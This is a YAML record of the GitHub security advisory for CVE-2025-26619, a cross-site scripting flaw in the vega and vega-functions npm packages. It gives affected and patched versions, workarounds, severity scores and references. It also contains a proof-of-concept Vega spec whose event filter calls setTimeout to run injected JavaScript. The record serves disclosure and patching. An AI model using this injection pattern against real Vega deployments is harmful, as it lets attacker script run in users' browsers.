advisory_id: GHSA-rcw3-wmx7-cphr
datasource_id: github_osv_importer_v2/GHSA-rcw3-wmx7-cphr
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-rcw3-wmx7-cphr/GHSA-rcw3-wmx7-cphr.json
aliases:
  - CVE-2025-26619
summary: "Vega Cross-Site Scripting (XSS) via event filter when not using CSP mode expressionInterpeter\n\
  ### Impact\n\nIn `vega` 5.30.0 and lower,  `vega-functions` 5.15.0 and lower , it was possible\
  \ to call JavaScript functions from the Vega expression language that were not meant to be\
  \ supported.\n\n### Patches\n\nPatched in `vega` `5.31.0`  / `vega-functions` `5.16.0`\n\n\
  ### Workarounds\n\n_Is there a way for users to fix or remediate the vulnerability without\
  \ upgrading?_\n\n- Run `vega` without `vega.expressionInterpreter`. This mode is not the default\
  \ as it is slower. \n- Using the interpreter [described in CSP safe mode](https://vega.github.io/vega/usage/interpreter/)\
  \ (Content Security Policy) prevents arbitrary Javascript from running, so users of this mode\
  \ are not affected by this vulnerability.\n\n### References\n\n- Reported to Vega-Lite by\
  \ @kprevas Nov 8 2024 in https://github.com/vega/vega-lite/issues/9469 &  https://github.com/vega/vega/issues/3984\n\
  \nReproduction of the error in Vega by @mattijn \n\n```\n{\n  \"$schema\": \"https://vega.github.io/schema/vega/v5.json\"\
  ,\n  \"signals\": [\n    {\n      \"name\": \"inject_alert\",\n      \"on\": [\n        {\n\
  \          \"events\": [\n            {\n              \"type\": \"mousedown\",\n        \
  \      \"marktype\": \"rect\",\n              \"filter\": [\"scale(event.view.setTimeout,\
  \ 'alert(\\\"alert\\\")')\"]\n            }\n          ],\n          \"update\": \"datum\"\
  \n        }\n      ]\n    }\n  ],\n  \"marks\": [\n    {\n      \"type\": \"rect\",\n    \
  \  \"encode\": {\n        \"update\": {\n          \"x\": {\"value\": 0},\n          \"y\"\
  : {\"value\": 0},\n          \"width\": {\"value\": 100},\n          \"height\": {\"value\"\
  : 100}\n        }\n      }\n    }\n  ]\n}\n```"
impacted_packages:
  - purl: pkg:npm/vega
    affected_versions: vers:npm/<5.31.0
    fixed_versions: vers:npm/5.31.0
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/vega-functions
    affected_versions: vers:npm/<5.16.0
    fixed_versions: vers:npm/5.16.0
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '6.1'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-rcw3-wmx7-cphr/GHSA-rcw3-wmx7-cphr.json
  - score: '6.9'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-rcw3-wmx7-cphr/GHSA-rcw3-wmx7-cphr.json
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-79
references:
  - url: https://github.com/vega/vega
    reference_type:
    reference_id:
  - url: https://github.com/vega/vega/commit/8fc129a6f8a11e96449c4ac0f63de0e5bfc7254c
    reference_type:
    reference_id:
  - url: https://github.com/vega/vega/issues/3984
    reference_type:
    reference_id:
  - url: https://github.com/vega/vega-lite/issues/9469
    reference_type:
    reference_id:
  - url: https://github.com/vega/vega/security/advisories/GHSA-rcw3-wmx7-cphr
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-26619
    reference_type:
    reference_id: CVE-2025-26619
